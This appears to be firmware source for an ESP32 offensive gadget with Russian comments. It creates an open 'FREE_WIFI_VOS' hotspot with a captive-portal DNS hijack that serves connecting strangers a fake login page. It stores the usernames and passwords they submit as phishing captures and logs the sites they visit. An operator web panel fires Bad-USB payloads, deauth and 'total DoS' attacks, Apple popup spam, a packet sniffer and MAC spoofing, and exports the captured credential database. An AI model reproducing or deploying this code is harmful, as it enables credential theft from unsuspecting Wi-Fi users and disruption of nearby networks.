#ifndef REMOTE_CTRL_H
#define REMOTE_CTRL_H

#include <WebServer.h>
#include <WiFi.h>

#include <DNSServer.h>

// Внешние переменные и функции
extern int selectedItem;
extern int currentMenu;
extern void runScanAP();
extern void drawMenu();
extern void resetPowerTimers();
extern void runBadUSB();
extern void runTVOff();
extern void randomizeMAC();
extern void startPhishing();
extern void runAutoSniper();
extern void runApplePopup();
extern void runDeauthAttack();
extern void runTotalDos();
extern void toggleGhostMode();

extern void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type);

extern uint32_t pkts_count;      // Ссылка на счетчик в .ino
extern bool isMonitoring;         // Ссылка на флаг в .ino
extern int current_sniffer_ch;   // Ссылка на канал в .ino
extern String live_ssids;        // Ссылка на список SSID в .ino
extern String topAccessPoint;    // Ссылка на топ-точку в .ino

uint32_t pkts_count = 0;         // Счетчик пакетов
int current_sniffer_ch = 1;      // Текущий канал монитора
String topAccessPoint = "NONE";  // Самая активная точка рядом
String live_ssids = "";          // Накопленный список SSID


bool isMonitoring = false;


extern WebServer server;
extern DNSServer dnsServer;

// --- HTML ИНТЕРФЕЙС V-OS S3 ---
const char* remote_html = R"=====(
<!DOCTYPE html><html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
  :root { --neon: #0f0; --bg: #050505; --red: #f00; }
  body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 10px; text-transform: uppercase; }
  .tabs { display: flex; overflow-x: auto; border-bottom: 1px solid #333; margin-bottom: 15px; background: #111; }
  .tab { padding: 12px 15px; cursor: pointer; color: #555; font-size: 11px; white-space: nowrap; border-bottom: 2px solid transparent; }
  .tab.active { color: var(--neon); border-bottom: 2px solid var(--neon); }
  .page { display: none; animation: fadeIn 0.3s; }
  .page.active { display: block; }
  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; max-width: 400px; margin: auto; }
  .full { grid-column: span 2; }
  .btn { background: #111; color: var(--neon); border: 1px solid var(--neon); padding: 18px; font-size: 13px; font-weight: bold; cursor: pointer; border-radius: 4px; }
  .btn:active { background: var(--neon); color: #000; }
  .danger { border-color: var(--red); color: var(--red); }
  .box { background:#000; border:1px solid #222; height:180px; padding:10px; font-size:11px; overflow-y:auto; color:#0f0; text-align:left; margin-bottom: 10px; white-space: pre-wrap; }
  .stat-row { display: flex; justify-content: space-around; margin-bottom: 10px; border: 1px solid #222; padding: 5px; }
  .stat-val { font-size: 18px; color: var(--neon); }
</style></head>
<body>
  <div class="tabs">
    <div class="tab active" onclick="openPage(event, 'remote')">REMOTE</div>
    <div class="tab" onclick="openPage(event, 'exploit')">EXPLOITS</div>
    <div class="tab" onclick="openPage(event, 'stealth')">STEALTH</div>
    <div class="tab" onclick="openPage(event, 'database')">DATABASE</div>
    <div class="tab" onclick="openPage(event, 'monitor')">MONITOR</div>
  </div>

  <!-- ОКНО 1: REMOTE -->
  <div id="remote" class="page active">
    <div class="grid">
      <button class="btn full" onclick="send('up')">▲ UP</button>
      <button class="btn" onclick="send('set')">SET</button>
      <button class="btn" onclick="send('back')">BACK</button>
      <button class="btn full" onclick="send('down')">▼ DOWN</button>
      <button class="btn full" onclick="send('scan')">SCAN & LOG MACs</button>
    </div>
  </div>

  <!-- ОКНО 2: EXPLOITS -->
  <div id="exploit" class="page">
    <div class="grid">
      <button class="btn danger full" onclick="send('payload')">⌨️ EXECUTE BAD-USB</button>
      <button class="btn danger full" onclick="send('tv')">📺 TV-B-GONE (OFF)</button>
      <button class="btn full" onclick="send('portal')">🌐 START PHISH PORTAL</button>
      <button class="btn danger" onclick="send('sniper')">SNIPER</button>
      <button class="btn danger" onclick="send('apple')">APPLE POP</button>
      <button class="btn danger full" onclick="send('total')">TOTAL DOS</button>
    </div>
  </div>

  <!-- ОКНО 3: STEALTH -->
  <div id="stealth" class="page">
    <div class="grid">
      <button class="btn full" onclick="send('mac')">🛡️ RANDOMIZE MAC</button>
      <button class="btn full" onclick="send('ghost')">👻 GHOST MODE</button>
      <button class="btn full" style="color:#aaa; border-color:#444;" onclick="downloadReport()">💾 DOWNLOAD SESSION LOG</button>
    </div>
  </div>

  <!-- ОКНО 4: DATABASE -->
  <div id="database" class="page">
    <div id="db_box" class="box">LOGGING READY...</div>
    <button class="btn full" onclick="downloadDB()">💾 EXPORT DATABASE (.CSV)</button>
  </div>

  <!-- ОКНО 5: MONITOR -->
  <div id="monitor" class="page">
    <div class="stat-row">
      <div style="text-align:center">PKTS/S<br><span id="pkt_val" class="stat-val">0</span></div>
      <div style="text-align:center">CH<br><span id="ch_val" class="stat-val">1</span></div>
    </div>
    <div id="mon_box" class="box">SNIFFER STOPPED</div>
    <div class="grid">
      <button class="btn" onclick="send('mon_toggle')">ON / OFF</button>
      <button class="btn" onclick="clearMonitor()">CLEAR</button>
    </div>
  </div>

  <script>
    let reportBuffer = "V-OS S3 SESSION LOG\n";
    
    function openPage(evt, id) {
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.getElementById(id).classList.add('active');
      evt.currentTarget.classList.add('active');
    }

    function send(cmd) {
      fetch('/cmd?v=' + cmd).then(r => r.text()).then(data => {
        reportBuffer += "[" + new Date().toLocaleTimeString() + "] " + data + "\n";
      });
    }

    function clearMonitor() {
      fetch('/cmd?v=mon_clear');
      document.getElementById('mon_box').innerText = "";
    }

    function downloadReport() {
      const blob = new Blob([reportBuffer], { type: 'text/plain' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = "VOS_S3_LOG.txt";
      a.click();
    }

    function downloadDB() {
      const text = document.getElementById('db_box').innerText;
      const blob = new Blob([text], { type: 'text/plain' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = "WIFI_DB.txt";
      a.click();
    }

    setInterval(() => {
      if(document.getElementById('database').classList.contains('active')) {
        fetch('/get_db').then(r => r.text()).then(t => { document.getElementById('db_box').innerText = t; });
      }
      if(document.getElementById('monitor').classList.contains('active')) {
        fetch('/get_mon').then(r => r.json()).then(d => {
          document.getElementById('pkt_val').innerText = d.pkts;
          document.getElementById('ch_val').innerText = d.ch;
          if(d.list) document.getElementById('mon_box').innerText = d.list;
        });
      }
    }, 1500);
  </script>
</body></html>
)=====";


// --- ЛОГИКА СЕРВЕРА ---
String wifiDatabase = "Captured SSID : Password\n";
String siteHistory = "CAPTURED TRAFFIC (SITES):\n";  // История посещенных сайтов

/////////
const char* login_html = R"=====(
<!DOCTYPE html><html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
  .logo { font-size: 40px; font-weight: bold; text-shadow: 0 0 10px #0f0; margin-bottom: 20px; }
  input { background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 80%; margin: 10px 0; outline: none; }
  .btn { background: #0f0; color: #000; border: none; padding: 10px 20px; width: 85%; font-weight: bold; cursor: pointer; }
  .info { font-size: 10px; color: #555; margin-top: 20px; }
</style></head>
<body>
  <div class="logo">V-OS S3</div>
  <p>SYSTEM AUTHORIZATION REQUIRED</p>
  <form action="/login" method="POST">
    <input type="text" name="user" placeholder="USERNAME" required><br>
    <input type="password" name="pass" placeholder="PASSWORD" required><br>
    <button type="submit" class="btn">LOGIN</button>
  </form>
  <div class="info">ENCRYPTED CONNECTION : AES-256</div>
</body></html>
)=====";

/////////


void handleLogData() {
  if (server.hasArg("plain")) {
    wifiDatabase += server.arg("plain") + "\n";
    server.send(200, "text/plain", "OK");
  }
}

void handleGetDB() {
  String fullReport = wifiDatabase + "\n" + siteHistory;
  server.send(200, "text/plain", fullReport);
}


void recordSite() {
  if (currentMenu == 99) {
    String host = server.header("Host");
    // Отсекаем системный мусор
    if (host.length() > 0 && host.indexOf("apple.com") == -1 && host.indexOf("gstatic.com") == -1 && host.indexOf("msftconnecttest.com") == -1) {

      if (siteHistory.indexOf(host) == -1) {
        siteHistory += "[" + String(millis() / 1000) + "s] TARGET_URL: " + host + "\n";
      }
    }
  }
}

void handleLogin() {
  if (server.hasArg("user") && server.hasArg("pass")) {
    String creds = "PHISH: " + server.arg("user") + " | PASS: " + server.arg("pass");
    wifiDatabase += creds + "\n";
    server.send(200, "text/html", "<html><body bgcolor=black><center><h1 style='color:red;'>404 ERROR</h1></center></body></html>");
  }
}

void handleRoot() {
  String clientIP = server.client().remoteIP().toString();
  
  // Записываем попытку входа в историю сайтов (для DATABASE)
  recordSite();

  // Если это ТЫ (первый подключенный с IP .2)
  if (clientIP == "192.168.4.2") {
    server.send(200, "text/html", remote_html);
  } 
  // Если это КТО-ТО ДРУГОЙ (жертва)
  else {
    server.send(200, "text/html", login_html);
  }
}


void handleGetMon() {
  String activity;
  if (pkts_count > 500) activity = "HIGH (Streaming/DL)";
  else if (pkts_count > 50) activity = "NORMAL (Web)";
  else activity = "LOW (Idle)";

  String json = "{";
  json += "\"pkts\":" + String(pkts_count) + ",";
  json += "\"ch\":" + String(current_sniffer_ch) + ",";
  json += "\"top\":\"" + topAccessPoint + "\",";
  json += "\"list\":\"" + live_ssids + "\",";  // Список всех найденных SSID
  json += "\"status\":\"SCANNING\"";
  json += "}";

  server.send(200, "application/json", json);
  pkts_count = 0;  // Сброс для корректного PPS (Packets Per Step)
}


void handleCmd() {
  String v = server.arg("v");
  String response = "OK: " + v;
  resetPowerTimers();

  if (v == "up") {
    selectedItem--;
    if (selectedItem < 0) selectedItem = 0;
  } else if (v == "down") {
    selectedItem++;
  } else if (v == "back") {
    currentMenu = 0;
    selectedItem = 0;
  } else if (v == "scan") {
    int n = WiFi.scanNetworks();
    response = "FOUND " + String(n) + " APs:\n";
    for (int i = 0; i < n; ++i) {
      response += WiFi.SSID(i) + " (" + WiFi.BSSIDstr(i) + ")\n";
    }
    runScanAP();
  } else if (v == "payload") {
    runBadUSB();
    response = "BAD-USB EXECUTED";
  } else if (v == "tv") {
    runTVOff();
    response = "TV-OFF SIGNAL SENT";
  } else if (v == "mac") {
    randomizeMAC();
    response = "MAC RANDOMIZED";
  } else if (v == "portal") {
    startPhishing();
    response = "PORTAL ONLINE";
  } else if (v == "sniper") {
    runAutoSniper();
    response = "SNIPER START";
  } else if (v == "apple") {
    runApplePopup();
    response = "APPLE POP SENT";
  } else if (v == "total") {
    runTotalDos();
    response = "TOTAL DOS START";
  } else if (v == "mon_toggle") {
    isMonitoring = !isMonitoring;
    if (isMonitoring) {
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
      current_sniffer_ch = 1;  // Старт с первого канала
      response = "MONITOR STARTED";
    } else {
      esp_wifi_set_promiscuous(false);
      response = "MONITOR STOPPED";
    }
  } else if (v == "mon_clear") {
    live_ssids = "";
    response = "MONITOR CLEARED";
  }



  server.send(200, "text/plain", response);
  drawMenu();
}

void initRemoteServer() {
  // 1. Создаем открытую сеть
  WiFi.softAP("FREE_WIFI_VOS", ""); 

  // 2. Запускаем DNS-сервер (перехватывает все домены на наш IP)
  dnsServer.start(53, "*", WiFi.softAPIP());

  const char* headerkeys[] = { "Host", "User-Agent" };
  server.collectHeaders(headerkeys, 2);

  // 3. Редиректы для всех систем (Captive Portal)
  server.on("/", handleRoot);
  server.on("/generate_204", handleRoot);         // Android
  server.on("/hotspot-detect.html", handleRoot);  // Apple
  server.on("/canonical.html", handleRoot);       // Xiaomi/Others
  server.on("/success.txt", handleRoot);          // Windows
  
  server.onNotFound(handleRoot); // Любой неизвестный путь -> на проверку IP

  // 4. Обработка данных
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/cmd", handleCmd);
  server.on("/get_db", handleGetDB);
  server.on("/log_data", HTTP_POST, handleLogData);
  server.on("/get_mon", handleGetMon);

  server.begin();

  updateDisplay("V-OS S3 READY\nSSID: FREE_WIFI_VOS\nIP: 192.168.4.1");
}


#endif
